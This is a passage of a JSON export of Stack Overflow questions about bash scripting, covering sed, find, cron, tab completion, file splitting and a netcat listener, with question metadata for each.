</p>\n"},{"tags":["regex","bash","sed","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":211,"score":0,"question_id":9601800,"title":"Print only parts that match regex","body":"<p><code>echo \"a b _c d _e f\" | sed 's/[ ]*_[a-z]\\+//g'</code></p>\n\n<p>The result will be <code>a b d f</code>.</p>\n\n<p>Now, how can I turn it around, and only print <code>_c _e</code>, while assuming nothing about the rest of the line?</p>\n"},{"tags":["bash","ubuntu","bash-completion"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":12792705,"title":"Why the backslash in bash?","body":"<p>I exported a variable in ~/.bashrc as follows (followed by source ~/.bashrc)</p>\n\n<pre><code>export w=/home/user/workspace/\n</code></pre>\n\n<p>When I'm on commandline I try to access sub-directories of $w in following way</p>\n\n<pre><code>user$ vi $w/\n</code></pre>\n\n<p>After this when I hit the tab key, a mysterious backslash appears</p>\n\n<pre><code>user$ vi \\$w/\n</code></pre>\n\n<p>It disables further tab-completion. Why? May not be <code>vi</code> specific as it occurs even with <code>ls</code>.</p>\n\n<p>Bash version 4.2.24(1)-release (i686-pc-linux-gnu)\nRunning Ubuntu 11.04</p>\n\n<p><strong>Edit</strong>\n<a href=\"http://lists.gnu.org/archive/html/bug-bash/2011-02/msg00274.html\" rel=\"nofollow\">Workaround</a>: Hit Esc+Ctrl+E before hitting tab. </p>\n"},{"tags":["regex","linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":478,"score":4,"question_id":9606503,"title":"Using sed and regex to capture last part of url","body":"<p>I'm trying to make sed match the last part of a url and output just that. For example:</p>\n\n<p><code>echo \"http://randomurl/suburl/file.mp3\" | sed (expression)</code></p>\n\n<p>should give the output:</p>\n\n<p><code>file.mp3</code></p>\n\n<p>So far I've tried <code>sed 's|\\([^/]+mp3\\)$|\\1|g'</code> but it just outputs the whole url. Maybe there's something I'm not seeing here but anyways, help would be much appreciated!</p>\n"},{"tags":["bash","shell","path"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12902227,"title":"bash: path with white space","body":"<p>I have a main file which uses(from the main I do a source) a properties file with variables pointing to paths. </p>\n\n<p>The properties file looks like this:</p>\n\n<pre><code>TMP_PATH=/$COMPANY/someProject/tmp\nOUTPUT_PATH=/$COMPANY/someProject/output\nSOME_PATH=/$COMPANY/someProject/some path\n</code></pre>\n\n<p>The problem is SOME_PATH, I must use a path with spaces(I can't change it). </p>\n\n<p>I tried escaping the whitespace, with quotes, but no solution so far.</p>\n\n<p>I edited the paths, the problem with single quotes is I'm using another variable $COMPANY in the path</p>\n"},{"tags":["bash","shell","cron","redhat"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":4136,"score":5,"question_id":3241086,"title":"cron : how to schedule to run first Sunday of every month","body":"<p>Hi I need to schedule a cron job to run at at 9:00 AM on first Sunday of every month.\nDid a little research and see that there is no short hand in cron to this.\nDo you know of an optimal way ?\nUsing Bash+RHL</p>\n"},{"tags":["bash","sed","awk","prepend"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12993228,"title":"Use Sed or Awk to add \"deny from all \" to a list of IP addresses","body":"<p>This is probably really simple, but I'd like to find out how to add \"deny from all \" (with the space after \"all\") to a list of IP's (there are probably over 4,000).</p>\n\n<p>Each line of the file contains a single IP addresses.</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13003919,"title":"Use cut to cut a field via user input","body":"<p>I need to create a bash script that will cut a column from a data file that has been requested by a user (input). The script needs to prompt a field that will become a variable used to cut the field requested. This is one of the scripts that I have tried:</p>\n\n<pre><code>$x = cut -c example_list\necho -n \"What column would you like to cut: \"\nset x = $&lt; \n</code></pre>\n"},{"tags":["git","bash","shell"],"answer_count":11,"favorite_count":26,"up_vote_count":66,"down_vote_count":0,"view_count":12591,"score":66,"question_id":1593051,"title":"How to programmatically determine the current checked out Git branch","body":"<p><strong>In a Unix or GNU scripting environment (e.g. a Linux distro, Cygwin, OSX), what is the best way to determine which Git branch is currently checked out in a working directory?</strong></p>\n\n<p>One use of this technique would be automatically labeling a release (like <code>svnversion</code> would do with Subversion).</p>\n\n<p>Please also see my related question: <a href=\"http://stackoverflow.com/questions/1593188/how-to-programmatically-determine-whether-the-git-checkout-is-a-tag-and-if-so-wh\">How to programmatically determine whether a Git checkout is a tag, and if so what is the tag name?</a></p>\n"},{"tags":["osx","bash","environment-variables"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12988393,"title":"Issue with setting $PATH directories","body":"<p>For some strange reason, I'm getting a \"No such file or directory\" error for my <code>$PATH</code> variable. I have tried to edit my path using <code>export</code>, changing it from what it was originally to every permutation from a single directory path to the original.</p>\n\n<p>When there is one directory (e.g., <code>export PATH=/bin</code>), I get \"/bin: Is a Directory\". But once I add more than one directory (e.g., <code>export PATH=/bin:/sbin</code>), I get \"No such file or directory\".</p>\n\n<p>I'm curious to see what the cause of this issue is!</p>\n"},{"tags":["linux","bash"],"answer_count":7,"favorite_count":6,"up_vote_count":14,"down_vote_count":0,"view_count":8763,"score":14,"question_id":2016844,"title":"Bash: Recursively remove files","body":"<p>Does anyone have a solution to remove those pesky ._ and .DS_Store files that one gets after moving files from a Mac to A Linux Server?</p>\n\n<p>specify a start directory and let it go? like /var/www/html/ down...</p>\n"},{"tags":["bash","netbeans","syntax-highlighting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13002479,"title":"Netbeans Bash syntax colouring seems rather minimal","body":"<p>I am currently working on a large set of bash scripts and I find Netbeans' syntax highlighting lacking. It works, sorta-kinda. I noticed <code>nano</code> on my Debian dev-box has a much nicer and more complete colouring scheme, and not just the language keywords and the strings. I tried looking for a better Netbeans scheme, but can't find one.</p>\n\n<p>My question is: am I missing a popular replacement, or do I have to create my own?</p>\n"},{"tags":["c","bash","escaping","echo","system-calls"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":13002325,"title":"Using bash system calls in C to write C that makes bash system calls","body":"<p>I'm playing around with an tiny app (in C) that, when run, creates a directory tree which it populates with files.  It does this by using a series of lines of the form </p>\n\n<p><code>system(\"echo \\\"lump = \\\" &gt;&gt; ./newdirectory/newfile.c\");</code></p>\n\n<p>This is working fine, except for when I try to have it write a line of C into the new file which itself contains a <code>system(\"echo\");</code> call.  </p>\n\n<p>Specifically,</p>\n\n<p><code>system(\"echo \\\"system(\\\"echo hello world\\\");\\\" &gt;&gt; ./newdirectory/newfile.c\");</code></p>\n\n<p>gets written as </p>\n\n<p><code>system(echo hello world);</code></p>\n"},{"tags":["bash","unix","file","unix-utils"],"answer_count":5,"favorite_count":8,"up_vote_count":16,"down_vote_count":1,"view_count":6056,"score":15,"question_id":2016894,"title":"Easy Way to Split a Large Text File?","body":"<p>I've got a large (by number of lines) plain text file that I'd like to split into smaller files, also by number of lines.  So if my file has around 2M lines, I'd like to split it up into 10 files that contain 200k lines, or 100 files that contain 20k lines (plus one file with the remainder; being evenly divisible doesn't matter).</p>\n\n<p>I could do this fairly easily in Python but I'm wondering if there's any kind of ninja way to do this using bash and unix utils (as opposed to manually looping and counting / partitioning lines).</p>\n"},{"tags":["bash","shell","script","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":12769183,"title":"Difference between ./script and sh script","body":"<p>I'm experiencing a weird issue with my following script :</p>\n\n<pre><code>#!/bin/sh\nfor asm_file in `find tremor -name \"*.s\"`; do\n    ./tremor/arm2gnu.pl $asm_file &gt; /tmp/a &amp;&amp; mv /tmp/a $asm_file\ndone\n</code></pre>\n\n<p>It converts file from an ASM format to another; needed for my android app.</p>\n\n<p>This command works well :</p>\n\n<pre><code>&gt; ./tremor_script.sh\n</code></pre>\n\n<p>And this one is failing :</p>\n\n<pre><code>&gt; sh tremor_script.sh\n(...)\nandroid/../libs/build/android/tremor/../../../tremor/floor1ARM.s:1: Error: junk at end of line, first unrecognized character is `,' \n(...etc)\n</code></pre>\n\n<p>What's the difference between them ? </p>\n\n<p>The problem is that I try to launch the script from another script; It fails too ?</p>\n\n<pre><code>cd script_location &amp;&amp; ./convert_tremor_asm.sh\n</code></pre>\n\n<p>Any clue ?</p>\n"},{"tags":["php","bash","processes","kill"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12993569,"title":"Bash script to kill a process if process count is over X amount","body":"<p>So, I was wondering if there was a way to see if one could use bash to kill a PID of a process if more than X amount spawned. For example:</p>\n\n<p>Let's say we have 10 php processes running with separate PIDs all with the command /usr/bin/php. If it hit 10 processes, would there be a way to kill it with a bash script?\n(I'll be having this script run full time in the foreground with a terminal)</p>\n"},{"tags":["eclipse","bash","shell","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":206,"score":2,"question_id":10231559,"title":"eclipse sh edit and run","body":"<p>What would be the best way to run and edit a .sh script within eclipse ?</p>\n\n<p>Regarding the editing part, I've found the ShellEd plugin, but it seems very minimalistic, is there no alternative ?</p>\n\n<p>Regarding the running part, I've found that there's a built in console that can be accessed by right clicking the .sh, then clicking 'remote system view', then clicking 'local'. But it's very minimalistic, there is not even tab completion. I would like something that could be as close to bash as possible.</p>\n"},{"tags":["bash","shell","script"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12972687,"title":"Listing directory's names with given arguments","body":"<p>I need to list the names of the directory's folders and files, but starting from <code>input1</code> until <code>input2</code> (arguments, user's inputs).</p>\n\n<pre><code>#!/bin/bash\nSTART_INDEX=$1\nEND_INDEX=$2\n     for $STA_INDEX in $(ls) -le $END_INDEX; do\n           echo item: $STA_INDEX\n     done\n</code></pre>\n\n<p>Together with my colleague, we came up with this \"solution\" which is not a solution at all!\nSo, can anyone try to explain me where I go wrong with this or give me another approach to a working solution. I think this piece of code will give you the main idea.</p>\n"},{"tags":["linux","bash","sudo"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12996397,"title":"Command not found when using sudo","body":"<p>I have a script called <code>foo.sh</code> in my home folder. When I navigate to this folder, and use <code>./foo.sh</code>, I get <code>-bash: ./foo.sh: Permission denied</code>. When I use <code>sudo ./foo.sh</code>, I get <code>sudo: foo.sh: command not found</code>.</p>\n\n<p>Does anybody know why this happens, and how to fix it? Thanks.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":10296172,"title":"bash script create multiple directories within directories","body":"<p>I want to create a directory structure like this in nix:</p>\n\n<p><code>mkdir -p 1,2,3,4,5,6,7,8,9</code> and within each of these folders I want folders <code>1,2,3,4,5,6,7,8,9</code></p>\n\n<p>I have started to write a simple loop like this (all the way up to folder 2) but this seems inefficient.</p>\n\n<pre><code>#!/usr/bin/env bash   \nfor i in 1 2 4 5 6 7 8 9; do mkdir -p 1/{1,2,3,4,5,6,7,8,9} $i, mkdir -p  2/{1,2,3,4,5,6,7,8,9} $2; done\n</code></pre>\n\n<p>Is there a better way of doing it?</p>\n"},{"tags":["bash","alias","hostname"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12999544,"title":"add hostname to ssh alias","body":"<p>I've set up an alias in my bashrc so I can access the cluster at work from home. However, to run programmes on it, I'd like to login to my work computer. How do I add that hostname so I can use one alias?</p>\n\n<p>I've tried just extending the alias by alias WORK=\"ssh user@work; user@hostname\", but I still only have access to my files and can't run anything. If I run the second part again once logged in, it then works. home is the same for both if that makes a difference as I tried to add another key. </p>\n"},{"tags":["linux","bash","text","utf-8","character-encoding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":12999651,"title":"How to remove non UTF-8 characters from text file","body":"<p>I have a bunch of Arabic, English, Russian files which are encoded in utf-8. Trying to process these files using a Perl script, I get this error:</p>\n\n<pre><code>Malformed UTF-8 character (fatal)\n</code></pre>\n\n<p>Manually checking the content of these files, I found some strange characters in them.\nNow I'm looking for a way to automatically remove these characters from the files.</p>\n\n<p>Is there anyway to do it?</p>\n"},{"tags":["bash","tab-completion","tcsh","completion"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1043,"score":5,"question_id":1529251,"title":"Tcsh and/or bash directory completion with variable hidden root prefix","body":"<p>I'm trying to set up directory completion in tcsh and/or bash (both are used at my site) with a slight twist: for a particular command \"foo\", I'd like to have completion use a custom function to match the first /-delimited term to an actual subtree node, and then follow normal directory completion for any successive terms.  It is sort of a combination of cdpath and completion, or I suppose a form of directory completion where the starting point is controlled by the completion script.  It would work as follows:</p>\n\n<pre><code>$ foo xxx&lt;TAB&gt;\n(custom completion function produces choices it finds at arbitrary levels in the dir tree)\nxxxYYY xxxZZZ xxxBLAH ...\nfoo xxxYYY/&lt;TAB&gt;\n(normal directory completion proceeds from this point on, to produce something like:)\nfoo scene/shot/element/workspace/user/...\n</code></pre>\n\n<p>We'd like to do this because we have a large production development tree (this is a CGI production facility), that shell-savvy users are navigating and jumping around in all the time.  The complaint is that the upper levels of the tree are cumbersome and redundant; they just need a quick search on the first term to find possible \"head\" choices and do directory completion from there.  It seems like programmable completion could offer a way to do this, but it is turning out to be pretty elusive.</p>\n\n<p>I've made several attempts of custom bash and tcsh completion to do this, but the closest I've gotten is a form of \"word completion\" where the user must treat the directory levels as separate words with spaces (e.g. foo scene/ shot/ element/ workspace/ ...).  I could continue hacking at my current scripts--but I've been wondering if there's something I'm not understanding--this is my first attempt to program completion, and the docs and examples are pretty thin in shell books and on the internet.  If there's any completion-guru's out there that can get me on the right track, I'd appreciate it.</p>\n\n<p>FWIW: here is what I've got so far (in tcsh first, then bash).  Note that the static root '/root/sub1/sub2/sub3' is just a placeholder for a search function that would find different matches in different levels.  If I can get that to work, I can sub in the search feature later.  Again, both examples do word completion, which requires user to type a space after each matching term (I also have to remove the spaces in the function to construct an actual path, yuck!)</p>\n\n<p>TCSH EXAMPLE (note the function is actually a bash script):</p>\n\n<pre><code>complete complete_p2 'C@*@`./complete.p2.list.bash $:1 $:2 $:3 $:4 $:5 $:6 $:7 $:8 $:9`@@'\n\n#!/bin/bash --norc\n\n# complete.p2.list.bash - Completion prototype \"p2\" for shotc command\n\n# Remove spaces from input arguments\nppath=`echo $@ | sed -e 's/ //g'`\n\n# Print basenames (with trailing slashes) of matching dirs for completion\nls -1 -d /root/sub1/sub2/sub3/$ppath* 2&gt;/dev/null | sed -e 's#^.*/##' | awk '{print $1 \"/\"}'\n</code></pre>\n\n<p>BASH EXAMPLE:</p>\n\n<pre><code>_foo() \n{\n    local cur prev opts flist\n    COMPREPLY=()\n    cur=\"${COMP_WORDS[COMP_CWORD]}\"\n    prev=\"${COMP_WORDS[COMP_CWORD-1]}\"\n\n    # Get all command words so far (omit command [0] element itself), remove spaces\n    terms=`echo ${COMP_WORDS[@]:1} | sed -e 's/ //g'`\n\n    # Get basenames (with trailing slashes) of matching dirs for completion\n    flist=`ls -1 -d /root/sub1/sub2/sub3/${terms}* 2&gt;/dev/null | sed -e 's#^.*/##' | awk '{print $1 \"/\"}' | xargs echo`\n\n    COMPREPLY=( $(compgen -W \"${flist}\" ${cur}) )\n    return 0\n}\ncomplete -F _foo foo\n</code></pre>\n"},{"tags":["bash","sh"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12998509,"title":"Is unsetting global variables defined in a script good practice?","body":"<p>Is it considered good practice, when writing sh scripts, to unset all previously defined global variables at the end of the script?</p>\n\n<p>If for example, I execute my script <code>myscript</code> using the . (source) builtin, like this</p>\n\n<pre><code>. myscript\n</code></pre>\n\n<p>after executing the script the shell is poluted with the variables defined in the script. This seems really bad (especially if used by other people).</p>\n\n<p>If I could, I would get rid of globals in sh (or bash) altogether but more often then not they are the least worst solution :-).</p>\n"},{"tags":["shell","environment","bash"],"answer_count":7,"favorite_count":81,"up_vote_count":132,"down_vote_count":1,"view_count":25531,"score":131,"question_id":415403,"title":"What's the difference between .bashrc, .bash_profile, and .environment?","body":"<p>I've used a number of different *nix-based systems of the years, and it seems like every flavor of Bash I use has a different algorithm for deciding which startup scripts to run.  For the purposes of tasks like setting up environment variables and aliases and printing startup messages (e.g. MOTDs), which startup script is the appropriate place to do these?</p>\n\n<p>What's the difference between putting things in <code>.bashrc</code>, <code>.bash_profile</code>, and <code>.environment</code>?  I've also seen other files such as <code>.login</code>, <code>.bash_login</code>, and <code>.profile</code>; are these ever relevant?  What are the differences in which ones get run when logging in physically, logging in remotely via ssh, and opening a new terminal window?  Are there any significant differences across platforms (including Mac OS X (and its Terminal.app) and Cygwin Bash)?</p>\n"},{"tags":["bash","autocomplete","symlink"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":224,"score":3,"question_id":10120274,"title":"bash autocompletion across a symbolic link","body":"<p>I have the following directory structure:</p>\n\n<pre><code>base/\n  dir/\n    subdir/\n    link -&gt; ../dir\n</code></pre>\n\n<p>Now if I cd to dir/link and type:</p>\n\n<pre><code>cd ../subd[tab]\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>cd ../subdir[space] \n</code></pre>\n\n<ol>\n<li><p>I would understand if autocomplete fails (because it would canonize the path and look into base/ and not dir/).</p></li>\n<li><p>I would also understand if it autocompletes to <code>cd ../subdir/</code> with the ending / (because it would interpret <code>..</code> as <code>go up one level</code> and search into dir/).</p></li>\n</ol>\n\n<p>But I do not understand the actual behaviour that is somewhere between the two. Ideally I would like bash to behave like 2. (autocomplete to cd ../subdir/). I am using fedora 14, bash version 4.1.7(1). Any idea how to accomplish this ?</p>\n"},{"tags":["osx","bash","itunes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":11276846,"title":"script for auto opening directories (mac os x) and creating m3u playlists","body":"<p>Imagine that you have some directories containing both <code>mp3</code> files and sub-directories, also containing <code>mp3</code> files, like:</p>\n\n<pre><code>/music/band1/\n/music/band2/\n/music/band2/dir1/\n/music/band2/dir2/\n/music/band3/dir1/\n/music/band3/dir2/\n/music/band4/\n...\n</code></pre>\n\n<p>I would like to create a <code>.m3u</code> file in every directory containing <code>mp3</code> files - so for example:</p>\n\n<pre><code>/music/band1/band1.m3u\n/music/band2/band2.m3u\n/music/band2/dir1/dir1.m3u\n/music/band2/dir2/dir2.m3u\n/music/band3/dir1/dir1.m3u\n/music/band3/dir2/dir2.m3u\n/music/band4/band4.m3u\n</code></pre>\n\n<p>The name of <code>.m3u</code> file will be the directory name in which the <code>.m3u</code> is created. (This is just an example directory structure.)</p>\n\n<p>I hope it is clear :)</p>\n\n<p>So far I have this to generate <code>m3u</code> files from <code>*.mp3</code> files, but only in the actual directory, and name it by directory.</p>\n\n<pre><code>#!/bin/bash\\\nls | grep -i mp3 &gt; filelist.txt\nmv filelist.txt filelist.m3u\nFOLDERNAME=${PWD##*/}\necho $FOLDERNAME\nmv filelist.m3u $FOLDERNAME.m3u\n</code></pre>\n\n<p>What should be added to have it look recursively into every subdirectory of <code>/music</code>, and if there is another sub-sub directory, also look there? Then, execute the <code>m3u</code>-making script in each sub-directory?</p>\n\n<p>Thank you for your help! :)</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12996037,"title":"Bash Scripting: Output of find command with quoted variable to an array","body":"<p>I'm trying to store the output of the find command to an array. </p>\n\n<p>I tried different things, and nothing seemed to work, couple of them in commented lines below. I guess the problem is with <strong>\"${findNameCmdSubDir[@]}\"</strong> is getting tokenized, and the the directories intended to exclude from search are ignored, and all directories are being listed.</p>\n\n<p>If i give the find command without passing it to an array i.e., the plain find command, i see the expected output of listing all the other directories without the excludes.</p>\n\n<pre><code>#! /bin/bash\nandroid_path=$1\nexcludeDirFromSearch=( doc build test unit-test script hardware prebuilt device . )\nlet \"dirCount = 0\"\n\nfindNameCmdSubDir=()\nfor dir in \"${excludeDirFromSearch[@]}\"; do\n    if [ $((dirCount++)) -eq ${#excludeDirFromSearch[@]} ]; then\n            findNameCmdSubDir+=(-name \"${dir}*\")\n    else\n            findNameCmdSubDir+=(-name \"${dir}*\" -prune -o)\n    fi\ndone\n\nsearchSubDirectories=()\nsearchSubDirectories=( $(find \"${android_path}\" -mindepth 1 -maxdepth 1 \\\n\"${findNameCmdSubDir[@]}\" -type d ) ) &lt;&lt;-- Not Working!\n#find \"${android_path}\" -mindepth 1 -maxdepth 1 \"${findNameCmdSubDir[@]}\" \\\n#    -type d | while read line; do\n#        echo \"$line\"\n#done  &lt;-- Not working\nfind \"${android_path}\" -mindepth 1 -maxdepth 1 \"${findNameCmdSubDir[@]}\" \\\n    -type d -print &lt;-- works as expected !\n\necho \"${searchSubDirectories[@]}\"\n</code></pre>\n\n<p><strong>Update</strong></p>\n\n<p>I tried escaping the double quotes and still no luck</p>\n\n<pre><code>searchSubDirectories=( $(find \"${android_path}\" -mindepth 1 -maxdepth 1 \\\"${findNameCmdSubDir[@]}\\\" -type d ) ) &lt;&lt;-- Not Working!\n</code></pre>\n"},{"tags":["bash","unix","script","directory","cd"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":93,"score":2,"question_id":12993646,"title":"UNIX - How to write a bash script to automatically change to next/previous directory","body":"<p>Say I have this folder structure:</p>\n\n<pre><code>MainFolder\n    Folder1\n    Folder2\n    Folder3\n    ...\n    Folder200\n</code></pre>\n\n<p>I want to write a script that, if I am current inside Folder2 and execute the script, it will automatically change to the next directory in the list, in this case, Folder3. The restrictions are that the folders could have any name, and I cannot rename it.</p>\n\n<p>So my questions are:</p>\n\n<p>1) How can I know what directory is next on the list? I was wondering if the subdirectories of a directory have a sequential index number that I could use to know what dir comes next. </p>\n\n<p>2) Since I would like to display the name of the new directory at the end of the script, is there a way to display only the dir name? (eg: Folder3 instead of /home/path/to/dir/Folder3 which is the result of \"pwd\")</p>\n"},{"tags":["bash","split"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12995050,"title":"split a file into x files where file names are numbered","body":"<p>In a bash script, how do I split a large text/csv file into n files (each of m rows); the resulting file names need to be numbered starting from 1 and increment by 1 [0,1...999...].</p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12993706,"title":"Building up a command string for find","body":"<p>I'm trying to parse the android source directory and i need to extract all the directory names excluding certain patterns. If you notice below., for now i included only 1 directory to the exclude list, but i will be adding more., </p>\n\n<p>The find command doesn't exclude the directory with name 'docs'.</p>\n\n<p>The commented out line works., but the other one doesn't. For easy debugging, i included the min and maxdepth which i would remove later.</p>\n\n<p>Any comments or hints on why it doesn't work?</p>\n\n<pre><code>#! /bin/bash\nANDROID_PATH=$1\nroot=/\nEXCLUDES=( doc )\ncd ${root}\nfor dir in \"${EXCLUDES[@]}\"; do\n    exclude_name_cmd_string=${exclude_name_cmd_string}$(echo \\\n                            \"-not -name \\\"${dir}*\\\" -prune\")\ndone\necho -e ${exclude_name_cmd_string}\ncustom_find_cmd=$(find ${ANDROID_PATH} -mindepth 1 -maxdepth 1 \\\n                    ${exclude_name_cmd_string} -type d)\n#custom_find_cmd=$(find ${ANDROID_PATH} -mindepth 1 -maxdepth 1 \\\n#                    -not -name \"doc*\" -prune -type d)\necho ${custom_find_cmd} \n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":404,"score":1,"question_id":521366,"title":"Copy files to directory based on user input and using * to list files","body":"<p>I want to create a extremely simple bash script, <code>my_copy.sh</code>, that reads arbitrary number of input files, a destination directory, and finally asks for confirmation if you want to copy the files. </p>\n\n<p>Example usage: <code>./my_copy.sh</code></p>\n\n<pre><code> Type in the file names to copy:\n file1 file2 Anna Kurt Arne\n Type in the directory to copy to:\n dir_3\n Are you sure you want to copy the files:\n Anna\n Kurt\n Arne\n to the directory dir_3 (y/n)?\n</code></pre>\n\n<p>If the destination directory does not exist, it should be created by the script.</p>\n\n<hr>\n\n<p>My next question:</p>\n\n<p>I want the * character to do a simple <code>ls</code> command. So if I type <code>./my_copy *</code> , in the command line it should list all files in my directory. </p>\n"},{"tags":["bash","shell","ubuntu"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12986561,"title":"Why is both the if and else executed?","body":"<p>My code is:</p>\n\n<pre><code>if [ \"$server\" == \"a\" ]; then\n        echo \"apache\"\nfi\n\nif [ \"$server\" ==  \"t\"   ]\nthen\n        echo \"tomcat\"\nelse\n        echo \"Entered\"\nfi\n</code></pre>\n\n<p>The value of the <code>$server</code> is <code>t</code>. I expect the value <code>tomcat</code> to be printed on the console. But <code>Entered</code> is printed too!</p>\n\n<p>I'm confused about this. How come both the <code>if</code> and <code>else</code> statements are executed?</p>\n"}]}
{"total":16352,"page":8,"pagesize":100,"questions":[{"tags":["bash"],"answer_count":6,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":75,"score":4,"question_id":11953185,"title":"Counting the number of dots in a string","body":"<p>How do I count the number of dots in a string in BASH? For example</p>\n\n<pre><code>VAR=\"s454-da4_sd.fs_84-df.f-sds.a_as_d.a-565sd.dasd\"\n\n# Variable VAR contains 5 dots\n</code></pre>\n\n<p>Thank you very much</p>\n"},{"tags":["bash","freebsd"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12990631,"title":"Bash script not working on a new dedicated server","body":"<p>Recently I have migrated to the new dedicated server which is running on <strong>the same</strong> operating system - FreeBSD 8.2. I got a root account access and all permissions have been set properly.</p>\n\n<p>My problem is that, the bash script I was running on the old server doesn't works on the new machine, the only error appearing while running the script is:</p>\n\n<pre><code># sh script.sh\nscript.sh: 3: Syntax error: word unexpected (expecting \")\")\n</code></pre>\n\n<p>Here is the code itself:</p>\n\n<pre><code>#!/usr/local/bin/bash\n\nPORTS=(7777:GAME 11000:AUTH 12000:DB)\nMESSG=\"\"\nfor i in ${PORTS[@]} ; do\n    PORT=${i%%:*}\n    DESC=${i##*:}\n    CHECK=`sockstat -4 -l | grep :$PORT | awk '{print $3}' | head -1`\n    if [ \"$CHECK\" -gt 1 ]; then\n        echo $DESC[$PORT] \"is up ...\" $CHECK\n    else\n        MESSG=$MESSG\"$DESC[$PORT] wylaczony...\\n\"\n        if [ \"$DESC\" == \"AUTH\" ]; then\n            MESSG=$MESSG\"AUTH is down...\\n\"\n        fi\n        if [ \"$DESC\" == \"GAME\" ]; then\n            MESSG=$MESSG\"GAME is down...\\n\"\n        fi\n        if [ \"$DESC\" == \"DB\" ]; then\n            MESSG=$MESSG\"DB is down...\\n\"\n        fi\n\n    fi\ndone\n\nif [ -n \"$MESSG\" ]; then\n    echo -e \"Some problems ocurred:\\n\\n\"$MESSG | mail -s \"Problems\" yet@another.com\nfi\n</code></pre>\n\n<p>I don't really code in bash, so I don't know why this happend...</p>\n"},{"tags":["linux","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":835,"score":0,"question_id":7908953,"title":"How to measure CPU usage","body":"<p>I would like to log CPU usage at a frequency of 1 second.</p>\n\n<p>One possible way to do it is via <code>vmstat 1</code> command.</p>\n\n<p>The problem is that the time between each output is not always exactly one second, especially on a busy server. I would like to be able to output the timestamp along with the CPU usage every second. What would be a simple way to accomplish this, without installing special tools?</p>\n"},{"tags":["bash","tcp","client-server","pipes","netcat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12992362,"title":"how to put tcp data from netcat to variables?","body":"<p>hello I have set up a server with the usual <strong>nc - lk port</strong> command.</p>\n\n<p>Well my client sends tcp data to the server socket in the form of xxx,yyy which are numbers.</p>\n\n<p>I want  every time the client connects that the values of xxx and yyy would be stored in variables in order to use them later.</p>\n\n<p>from what I understood I must work with pipes but I am not sure how</p>\n\n<p>any ideas guys?</p>\n"},{"tags":["bash","unix","redirect","command","pipe"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12942042,"title":"Pipe | Redirection < > Precedence","body":"<p>I want to make clear when does pipe | or redirection &lt; > takes precedence in a command?</p>\n\n<p>This is my thought but need confirmation this is how it works.</p>\n\n<p>Example 1:</p>\n\n<pre><code>sort &lt; names | head\nThe pipe runs first:  names|head   then it sorts what is returned from names|head\n</code></pre>\n\n<p>Example 2:</p>\n\n<pre><code>ls | sort &gt; out.txt\nThis one seems straight forward by testing, ls|sort then redirects to out.txt\n</code></pre>\n\n<p>Example 3:</p>\n\n<pre><code>Fill in the blank?  Can you have both a &lt; and a &gt; with a | ???\n</code></pre>\n"},{"tags":["bash","node.js","express","npm"],"answer_count":3,"favorite_count":6,"up_vote_count":8,"down_vote_count":0,"view_count":3300,"score":8,"question_id":6103121,"title":"express command not found in bash after installing it with npm","body":"<p>just installed new ubuntu vm to test around with node\ninstalled things in this 